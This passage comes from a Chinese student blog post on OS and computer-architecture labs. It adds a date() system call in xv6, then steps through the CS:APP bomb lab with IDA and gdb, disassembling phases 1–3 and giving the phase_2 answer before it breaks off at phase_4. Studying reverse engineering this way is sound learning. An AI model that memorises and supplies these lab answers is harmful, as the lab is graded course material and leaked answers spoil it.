<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个char* 数组</span></span><br><span class="line"><span class="keyword">char</span>* syscallName[] = &#123;</span><br><span class="line">  <span class="string">"null"</span>,</span><br><span class="line">  <span class="string">"fork"</span>,</span><br><span class="line">  <span class="string">"exit"</span>,</span><br><span class="line">  <span class="string">"wait"</span>,</span><br><span class="line">  <span class="string">"pipe"</span>,</span><br><span class="line">  <span class="string">"read"</span>,</span><br><span class="line">  <span class="string">"kill"</span>,</span><br><span class="line">  <span class="string">"exec"</span>,</span><br><span class="line">  <span class="string">"fstat"</span>,</span><br><span class="line">  <span class="string">"chdir"</span>,</span><br><span class="line">  <span class="string">"dup"</span>,</span><br><span class="line">  <span class="string">"getpid"</span>,</span><br><span class="line">  <span class="string">"sbrk"</span>,</span><br><span class="line">  <span class="string">"sleep"</span>,</span><br><span class="line">  <span class="string">"uptime"</span>,</span><br><span class="line">  <span class="string">"open"</span>,</span><br><span class="line">  <span class="string">"write"</span>,</span><br><span class="line">  <span class="string">"mknod"</span>,</span><br><span class="line">  <span class="string">"unlink"</span>,</span><br><span class="line">  <span class="string">"link"</span>,</span><br><span class="line">  <span class="string">"mkdir"</span>,</span><br><span class="line">  <span class="string">"close"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 这里通过 syscall.h 中的宏定义实现由 num 到相应系统调用的映射.</span></span><br><span class="line">    cprintf(<span class="string">"%s -&gt; %d\n"</span>,syscallName[num],num);</span><br><span class="line">    curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/syscall.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/syscall.png" alt title class></a>
                <p></p>
            </figure>

<p>如图应该是成功了, 但我不知道为啥和MIT里的编号不同. </p>
<h4 id="Date-system-call"><a href="#Date-system-call" class="headerlink" title="Date system call"></a>Date system call</h4><p>下一步就该建立我们的<code>date()</code>函数了.</p>
<p>使用命令找出需要修改的几个地方:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/yjn/xv6-public$ grep -n uptime *.[chS]</span><br><span class="line">syscall.c:106:extern int sys_uptime(void);</span><br><span class="line">syscall.c:125:  <span class="string">"uptime"</span>,</span><br><span class="line">syscall.c:150:[SYS_uptime]  sys_uptime,</span><br><span class="line">syscall.h:15:<span class="comment">#define SYS_uptime 14</span></span><br><span class="line">sysproc.c:83:sys_uptime(void)</span><br><span class="line">user.h:25:int uptime(void);</span><br><span class="line">usys.S:31:SYSCALL(uptime)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>syscall.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_date</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面是简略写法:</span></span><br><span class="line"><span class="keyword">char</span>* syscallName[] :</span><br><span class="line">  <span class="string">"date"</span></span><br><span class="line"><span class="comment">// 下面是简略写法:</span></span><br><span class="line">static int (*syscalls[])(void) :</span><br><span class="line">  [SYS_date]    sys_date</span><br></pre></td></tr></table></figure>
</li>
<li><p>syscall.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_date   22</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>sysproc.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> </span><br><span class="line">sys_date(<span class="keyword">void</span>)&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> *<span class="title">r</span>;</span></span><br><span class="line">  <span class="keyword">if</span>(argptr(<span class="number">0</span>, (<span class="keyword">void</span>*)&amp;r, <span class="keyword">sizeof</span>(*r) &lt; <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">  cmostime(r);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>user.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">date</span><span class="params">(struct rtcdate*)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>usys.S</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL(date)</span><br><span class="line">``` </span><br><span class="line">还有需要一个程序来调用`date()`以验证效果.</span><br><span class="line">+ date.c</span><br><span class="line">```c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"date.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (date(&amp;r)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">"date failed\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// your code to print the time in any format you like...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">"%d/%d/%d-%d:%d:%d"</span>,r.year, r.month, r.day, r.hour, r.minute, r.second);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>最后不要忘了在<code>Makefile</code>里加上 date 这个程序.</p>
<p>效果: <figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/date.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/date.png" alt title class></a>
                <p></p>
            </figure></p>
<h2 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h2><h3 id="bomb-从零开始的汇编世界之旅"><a href="#bomb-从零开始的汇编世界之旅" class="headerlink" title="bomb(从零开始的汇编世界之旅)"></a>bomb(从零开始的汇编世界之旅)</h3><p>这个实验我 tm 吹爆. </p>
<p>我有预感, 这会是我迈入 <code>reverse</code> 和 <code>pwn</code> 的第一个阶梯.</p>
<ul>
<li>实验简介 : 给你一个<a href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/bomb" target="_blank" rel="noopener">bomb程序</a>, 需要你连续输入六个密码才能阻止引爆. 你需要做的就是通过反编译这个程序破译出6个密码.</li>
</ul>
<p>同时, 题目也给出了main函数的代码, 让玩家可以对整体的框架有个了解.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">	    infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">  	  <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">	      <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">	      <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">  	  &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    initialize_bomb();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line">    input = read_line();           </span><br><span class="line">    phase_1(input);                  </span><br><span class="line">    phase_defused();             </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>main.c</code>我们可以知道所有关于密码正确与否都是在phase函数中完成的.</p>
<h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>最简单的一关, 有无数种方法可以搞定.</p>
<ul>
<li>IDA<br>IDA 静态分析神器的大名早有耳闻, 所以第一时间就想到了使用 IDA. </li>
</ul>
<p>不出我所料, 反编译后发现就是把我们输入的密码<code>input</code>与代码中的一段字符串常量进行了比较. 非常轻松.</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/1.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/1.png" alt title class></a>
                <p></p>
            </figure>

<p>由于IDA不是本次实验的重点, 就不在此重点展开了.</p>
<p>重点是使用 <code>gdb</code> 调试器的方法来获取 <code>password</code></p>
<ul>
<li>gdb</li>
</ul>
<p>由于一开始没有找到中意的图形化界面调试器, 我在 <code>YW 大佬</code> 的推荐下使用了<code>pwndbg</code> 这个工具, 确实很强大, 而且和 <code>gdb</code>的使用方法基本相同. </p>
<p><a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/2.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/2.png" alt></a></p>
<p>因为密码的判断在<code>phase_2</code>中, 我就先调试这段代码. 密码什么的先随便输一个.</p>
<p>进入后最显眼的还是<code>strings_not_equal</code>这个函数. (因为整个屏幕就这里有人话……)</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/3.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/3.png" alt title class></a>
                <p></p>
            </figure>

<p>调用函数后, 汇编代码是如何实现输错密码就爆炸, 输对不爆炸的呢?</p>
<p>调用<code>strings_not_equals</code>后, 其返回值会保存在寄存器 <code>$eax</code> 中.</p>
<p>下面的指令 <code>test</code> 会让两个操作数做与运算, 但是结果并不保存在寄存器或是内存中, 而是发送到 flag寄存器 中的某个标志位(大概记得是第6位, 记不清了).</p>
<p>再下面一行的 <code>je</code> 就会读取该标志位, 如果为零就跳转, 否则不跳转. 可是在这里一旦不跳转而是继续顺序执行, 就会调用 <code>explode_bomb</code>, 程序会不可逆的走向终止.</p>
<p>也就是为了不让炸弹启动, 一定要保证<code>strings_not_equal</code>返回 0 才可以, 这也就是密码的由来.</p>
<h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>从第二题开始就增加难度了, 经过漫长的尝试, 我终于搞出了密码.</p>
<p>进入<code>phase_2</code>, 首先被调用的函数就是<code>read_six_numbers</code>. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>我这里遇到的第一个问题就是搞不懂<code>&lt;__isoc99_sscanf@plt&gt;</code>的作用, 当时十分迷惑为啥进入了<code>phase_2</code>后还要继续输入, 但其实不是这么回事, 这个函数在这里是格式化字符串的作用.</p>
<p>举个例子:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>( dtm, <span class="string">"Saturday March 25 1989"</span> );</span><br><span class="line"><span class="built_in">sscanf</span>( dtm, <span class="string">"%s %s %d  %d"</span>, weekday, month, &amp;day, &amp;year )</span><br><span class="line"><span class="comment">//=&gt; weekday = Saturday, month = March, day = 25, year = 1989</span></span><br></pre></td></tr></table></figure>

<p>当我们调用<code>&lt;__isoc99_sscanf@plt&gt;</code>时, 传入的参数为:</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/5.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/5.png" alt title class></a>
                <p></p>
            </figure>

<p>可以看到这里的前两个参数就对应着C语言中的代码. 最后函数会将字符串中的 6 个整数提取出来(恐怕这也是这段函数名为<code>read_six_numbers</code>的原因)</p>
<p>从<code>sscanf</code>返回后, <code>$eax</code>中保存着提取的整数个数, 紧接着会进行比较是否大于5, 如果不是就会触发炸弹.</p>
<p>从<code>read_six_numbers</code>返回到<code>phase_2</code>后, 会进入密码的验证阶段.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">    #### 程序从这里返回</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p><code>cmpl   $0x1,(%rsp)</code> , 在调试器中跟进很容易发现这里是把我们输入的第一个整数和1比较, 得出第一个数字是 1. 如果这里正确的话, 会跳转至<code>400f30</code>, 随后进入一段迭代.</p>
<p>仔细分析迭代的代码, 会发现每次决定我们生死的指令为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">400f1c:	39 03                	cmp    %eax,(%rbx)</span><br></pre></td></tr></table></figure>

<p>通过跟进调试器, 这段迭会通过<code>$rbx</code>和<code>$rbp</code>两个寄存器组成一对上下标来访问访问处于栈中的我们的6个整数, 并且在每轮迭代使寄存器<code>$eax</code>的值等于上个整数的值再×2. 那么为了每次的判断为真, 需要前后两个整数差一倍, 规律就出来了, 即 1, 2 ,4 ,8, 16, 32.</p>
<h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>这道题先看<code>phase_3</code>的前几行汇编.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br></pre></td></tr></table></figure>

<p>这里也有<code>isoc99_sscanf</code>, 通过查看常量和使用调试器跟进, 发现是读取两个整数.</p>
<p>从<code>sscanf</code>返回回来后, <code>$eax</code>与常量 1 比较, 可知至少要输入 2 个数字.</p>
<p><code>cmpl   $0x7,0x8(%rsp)</code> 可知输入的第一个数要小于等于7.</p>
<p>然后会进入一个<code>switch</code>的环节.</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/6.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/6.png" alt title class></a>
                <p></p>
            </figure>

<p><code>400f75:    ff 24 c5 70 24 40 00     jmpq   *0x402470(,%rax,8)</code></p>
<p>跳转地址的公式为 : <code>0x402470 + ($rax * 8)</code> 就形成了一个类似<code>switch case</code>的功能. <code>$rax</code>在这里存放的是我输入的第一个数字.</p>
<p>我在这里遇到的一个问题是, 在通过调试器跟进时, 发现哪条指令都没对<code>$rax</code>进行操作, 莫名其妙的最后就成了我输入的第一个数字. 后来才知道<code>rax(64位)</code>和<code>eax(32位)</code>是共享32位的, 对<code>eax</code>的操作约等于<code>rax</code>(不溢出的前提下).</p>
<p>进入<code>swtich</code>后, 程序会对 <code>eax</code> 再赋某一个常量, 最后再把它和我们输入的第二个数比较, 相等就成了. 所以这道题的答案不唯一, 只要进到的分支能和最后的输入匹配上就好了. </p>
<h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>先看汇编代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>还是用的<code>sscanf</code>来提取输入的整数, 且这次只能输入两个.</p>
<p>这道题强烈推荐使用 ida 的生成伪代码的功能.</p>
<p>phase_4 :</p>
